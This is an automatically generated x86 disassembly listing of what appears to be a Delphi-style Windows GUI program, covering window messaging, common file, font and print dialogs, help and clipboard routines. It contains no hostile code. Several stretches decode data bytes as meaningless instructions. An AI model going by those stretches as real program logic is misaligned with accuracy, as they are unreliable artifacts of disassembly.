sub_430f60
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_43112b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx + 0x42a2e8d3 ]
add [ eax ] eax
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_431333
jmp sub_403e54
sub_43133a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4313c2
jmp sub_403e54
sub_4313c9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4313d0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_444e14
pop ebx
retn
sub_4313e4
push ebx
mov ebx eax
mov eax ebx
call sub_447ae8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_444e14
pop ebx
retn
sub_431400
push ebx
mov ebx eax
mov eax ebx
call sub_446ad4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_431480
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441d64
pop esi
pop ebx
retn
sub_4315ea
jmp sub_403e54
sub_4315f1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431700
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_443e3c
mov eax ebx
mov si 0xffc7
call sub_4038bc
pop esi
pop ebx
retn
sub_4317ec
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431808
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_4038bc
sub_431824
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_431830
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41e274
sub_431844
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4318a0
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431914
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_4038bc
pop esi
pop ebx
retn
sub_431930
push esi
mov esi eax
mov eax esi
call sub_443948
mov eax esi
mov si 0xffc7
call sub_4038bc
pop esi
retn
sub_4319d5
jmp sub_403e54
sub_4319dc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4319e4
push ebx
mov ebx eax
mov eax ebx
call sub_443aac
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_431a08
push ebx
mov ebx eax
mov eax ebx
call sub_443ac4
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_431af4
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_43211c
sub_431b08
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_43211c
mov eax ebx
call sub_445ac0
sub_431b2c
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_445ac0
sub_431b40
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_445ac0
sub_431b84
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_445ac0
sub_431c85
jmp sub_403e54
sub_431c8c
pop ebx
pop ecx
pop ebp
retn
sub_431da4
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_448484
push eax
call SetWindowTextA
pop ebx
retn
sub_431dc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_431ddc
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_431e82
jmp sub_403e54
sub_431e89
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431f22
jmp sub_403e54
sub_43209b
jmp sub_403e54
sub_432100
push ebx
mov ebx eax
mov eax ebx
call sub_431b98
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_4458bc
pop ebx
retn
sub_432200
push ebx
mov ebx eax
mov eax ebx
call sub_441970
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4322f8
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_4038bc
sub_4325bb
jmp sub_403e54
sub_4325c2
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43266c
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xdc ]
pop esi
retn
sub_4326cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_441d64
pop esi
pop ebx
retn
sub_4327a9
jmp sub_403e54
sub_4327b0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432a3c
mov al [ eax + 0x224 ]
retn
sub_432a44
push ebx
mov ebx eax
mov eax ebx
call sub_443e3c
xor edx edx
mov eax ebx
call sub_431bd0
pop ebx
retn
sub_432a5c
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_445ac0
sub_432a70
push esi
mov esi eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_432a80
cmp dl [ eax + 0x225 ]
je r-xdata
retn
mov [ eax + 0x225 ] dl
call sub_445ac0
sub_432a94
cmp dl [ eax + 0x226 ]
je r-xdata
retn
mov [ eax + 0x226 ] dl
call sub_445ac0
sub_432adc
call sub_447758
retn
sub_432b08
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_432b8a
jmp sub_403e54
sub_432b91
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432c68
jmp sub_403e54
sub_432c6f
pop ebx
pop ecx
pop ebp
retn
sub_432e40
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_441d40
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_432e90
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_432f84
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_445ac0
sub_432fb8
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
sub_432fcc
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
sub_432fe0
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
sub_433018
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_442f30
sub_433148
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
pop esi
pop ebx
retn
sub_43341f
jmp sub_403ba0
sub_433424
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4336b0
jmp sub_403e54
sub_4336b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4336c0
push ebx
mov ebx eax
mov eax ebx
call sub_441970
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4336e4
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_433760
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43387a
jmp sub_403e54
sub_4338c4
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xcc ]
retn
sub_43394f
jmp sub_403e54
sub_433956
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433988
mov edx [ eax ]
call [ edx + 0x100 ]
retn
sub_433994
mov [ eax + 0x210 ] edx
retn
sub_4339e5
jmp sub_403e54
sub_4339ec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433aa6
jmp sub_403e54
sub_433b50
mov eax [ r-xdata ]
retn
sub_433b58
xor eax eax
retn
sub_433b7c
retn
sub_433cd0
push ebx
mov ebx eax
mov eax ebx
call sub_441970
mov eax ebx
call sub_4432bc
pop ebx
retn
sub_433ce4
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_433cf0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_445ac0
sub_433d04
test dl dl
je r-xdata
xor edx edx
call sub_433d18
retn
mov dl 0x1
call sub_433d18
retn
sub_433df4
push ebx
mov ebx eax
mov eax ebx
call sub_446ad4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433e08
call sub_445ac0
retn
sub_433e9e
jmp sub_403e54
sub_433ea5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433eac
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xcc ]
sub_433f1c
mov al [ eax + 0x211 ]
retn
sub_433f50
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_445ac0
sub_434130
call sub_445ac0
retn
sub_4341ad
jmp sub_403e54
sub_4341b4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434577
jmp sub_403e54
sub_43457e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_434588
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_434440
retn
sub_4345f4
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_434440
retn
sub_43460c
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_434440
retn
sub_434620
push ebx
mov ebx eax
mov eax ebx
call sub_441970
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_434644
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43477c
call sub_434664
retn
sub_434784
call sub_434664
retn
sub_4347b4
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
sub_43493c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_434945
jmp sub_403e54
j_sub_43493c
jmp sub_43493c
sub_43494c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434954
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax ebx
call sub_434998
pop ebx
retn
sub_434968
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_434998
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_434984
push ebx
mov ebx eax
mov eax ebx
call sub_443e3c
mov eax ebx
call sub_434998
pop ebx
retn
sub_434a70
jmp sub_403e54
sub_434a77
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434ab0
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_445ac0
sub_434ac4
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
test dl dl
je r-xdata
call sub_434998
sub_434adc
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_445ac0
sub_434af0
mov [ eax + 0x20c ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41e274
sub_434b04
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_445ac0
sub_434b3d
jmp sub_403e54
sub_434b44
pop ebp
retn
sub_434b48
sub [ rw-data ] 0x1
retn
sub_434b75
jmp sub_403e54
sub_434b7c
pop ebp
retn
sub_434b80
sub [ rw-data ] 0x1
retn
sub_434bad
jmp sub_403e54
sub_434bb4
pop ebp
retn
sub_434bb8
sub [ rw-data ] 0x1
retn
sub_434be5
jmp sub_403e54
sub_434bec
pop ebp
retn
sub_434bf0
sub [ rw-data ] 0x1
retn
sub_434c1d
jmp sub_403e54
sub_434c24
pop ebp
retn
sub_434c28
sub [ rw-data ] 0x1
retn
sub_434c55
jmp sub_403e54
sub_434c5c
pop ebp
retn
sub_434c60
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ __import_lookup_table_14(comdlg32:GetOpenFileNameA) ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
ChooseFontA
jmp [ ChooseFontA@IAT ]
PrintDlgA
jmp [ __import_lookup_table_14(comdlg32:PrintDlgA) ]
sub_434cbd
jmp sub_403e54
sub_434cc4
pop ebp
retn
sub_434cc8
sub [ rw-data ] 0x1
retn
sub_436a1c
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_436c15
jmp sub_403e54
sub_436c1c
pop ebx
mov esp ebp
pop ebp
retn
sub_436d28
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_436d98
sub_436d40
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_436d50
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_436d98
sub_436d68
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_436d98
sub_436d80
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_436d98
sub_436f78
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436f94
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43742a
jmp sub_403ba0
sub_4374e3
jmp sub_403e54
sub_4374ea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437500
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_437464
sub_437510
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_437464
pop ebp
retn 0x8
sub_437528
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_437628
push ebx
mov ebx eax
mov eax ebx
call sub_447aa8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43763c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437670
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_437774
jmp sub_403e54
sub_43777b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437905
jmp sub_403e54
sub_43790c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437917
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x21f ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43792c
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_444e14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_437964
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_444e14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_437980
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_444e14
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43799c
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_445ac0
sub_4379b0
mov al [ eax + 0x21f ]
retn
sub_437b19
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_437b31
jmp sub_403e54
sub_437dfd
jmp sub_403ba0
sub_437f70
retn
sub_4380fd
jmp sub_403e54
sub_438180
push ebx
mov ebx eax
mov eax ebx
call sub_443e3c
mov eax ebx
call sub_437f74
pop ebx
retn
sub_438194
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44455c
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_4382bc
pop ebx
retn
sub_4382ac
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_438385
jmp sub_403e54
sub_43838c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4383d4
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax ebx
call sub_437f74
pop ebx
retn
sub_4383e8
push ebx
mov ebx eax
mov eax ebx
call sub_431400
mov eax ebx
call sub_437f74
pop ebx
retn
sub_4383fc
mov al 0x1
retn
sub_438400
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43842d
jmp sub_403e54
sub_438434
pop ebp
retn
sub_438438
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
call sub_4157d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
sub_438481
jmp sub_403e54
sub_438488
pop ebp
retn
sub_43848c
sub [ rw-data ] 0x1
retn
sub_438904
jmp r-xdata
sub_438906
0x28ffe9ff 0x4399
sub_439562
jmp sub_403ba0
sub_439567
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439584
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_43958c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4038bc
pop esi
retn
sub_4395a4
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4038bc
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4395bc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_439665
jmp sub_403e54
sub_439693
jmp sub_403e54
sub_43969a
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4396a4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4396b8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_439950
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_439970
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_439990
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4399e2
jmp sub_403e54
sub_4399e9
pop ecx
pop ebp
retn
sub_439d31
jmp sub_403e54
sub_439d38
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439e71
jmp sub_403e54
sub_439e78
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439f37
jmp sub_403e54
sub_439f3e
pop ebx
mov esp ebp
pop ebp
retn
sub_439ff0
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_43a058
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_439a80
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43a070
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_43a08c
push ebx
mov ebx eax
mov edx GetSaveFileNameA
mov eax ebx
call sub_439a80
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43a1a0
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_43a243
jmp sub_403ba0
sub_43a3fd
jmp sub_403e54
sub_43a404
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a410
push esi
mov esi eax
mov eax [ esi + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43a4bd
jmp sub_403e54
sub_43a4c4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a5c4
jmp sub_403e54
sub_43a640
jmp sub_403e54
sub_43a647
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a6d2
jmp sub_403e54
sub_43a94c
call sub_4036c0
retn
sub_43acd4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_43ace8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404694
pop esi
pop ebx
retn
sub_43ad04
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_43ad1c
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_43ad50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_404694
pop esi
pop ebx
retn
sub_43ad6c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_43ad1c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_43ae66
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_43b14e
jmp sub_403e54
sub_43b155
pop ebp
retn
sub_43b158
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_404200
call sub_43afa8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
sub_43b254
jmp sub_403e54
sub_43b25b
pop ecx
pop ebp
retn
sub_43b260
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_43b396
jmp sub_403e54
sub_43b39d
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b446
jmp sub_403e54
sub_43b4ac
jmp sub_403e54
sub_43b4b3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b511
jmp sub_403e54
sub_43b518
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b5fd
jmp sub_403e54
sub_43b604
pop ebx
mov esp ebp
pop ebp
retn
sub_43b681
jmp sub_403e54
sub_43b688
pop ebx
mov esp ebp
pop ebp
retn
sub_43b726
jmp sub_403ba0
sub_43b789
jmp sub_403e54
sub_43b790
pop ebp
retn
sub_43b794
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_43b810
retn
sub_43b811
jmp sub_403e54
j_sub_43b810
jmp sub_43b810
sub_43b818
pop ebp
retn
sub_43b81c
sub [ rw-data ] 0x1
retn
sub_43b979
jmp sub_403e54
sub_43b980
pop ebp
retn
sub_43b984
sub [ rw-data ] 0x1
retn
sub_43b98d
add eax 0xffffffe0
jmp sub_43c1dc
sub_43b995
add eax 0xffffffe0
jmp sub_43bf5c
sub_43b99d
add eax 0xffffffe0
jmp sub_43bfc4
sub_43b9a5
add eax 0xffffffe0
jmp sub_43c0d8
sub_43b9ad
add eax 0xffffffe0
jmp sub_43c14c
sub_43b9b5
add eax 0xffffffe0
jmp sub_43bc24
sub_43b9bd
add eax 0xffffffe0
jmp sub_43bc38
sub_43b9c5
add eax 0xffffffe0
jmp sub_43bcb0
sub_43b9cd
add eax 0xffffffe0
jmp sub_43bd54
sub_43b9d5
add eax 0xffffffe0
jmp sub_43bd58
sub_43b9dd
add eax 0xffffffe0
jmp sub_43bde0
sub_43b9e5
add eax 0xffffffe0
jmp sub_43bf0c
sub_43b9ed
add eax 0xffffffe0
jmp sub_43bf10
sub_43b9f5
add eax 0xffffffe0
jmp sub_43bf2c
sub_43ba07
add [ esp + 0x4 ] 0xffffffe0
jmp sub_406264
sub_43ba11
add [ esp + 0x4 ] 0xffffffe0
jmp sub_406278
sub_43bbe8
jmp sub_403e54
sub_43bbef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bc24
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_404480
pop ebx
retn
sub_43bc9f
jmp sub_403e54
sub_43bca6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bd38
jmp sub_403e54
sub_43bd3f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43bd54
mov al 0x1
retn
sub_43bdd3
jmp sub_403e54
sub_43bdda
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43bebe
jmp sub_403e54
sub_43bec5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bf0c
mov [ eax + 0xc ] edx
retn
sub_43bf10
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43bfb4
jmp sub_403e54
sub_43bfbb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c0ba
jmp sub_403e54
sub_43c0c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c13a
jmp sub_403e54
sub_43c141
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c1cc
jmp sub_403e54
sub_43c1d3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c2d8
jmp sub_403e54
sub_43c2df
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43c3a0
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43c2ec
call EnumWindows
retn
sub_43c436
jmp sub_403e54
sub_43c43d
mov eax ebx
pop esi
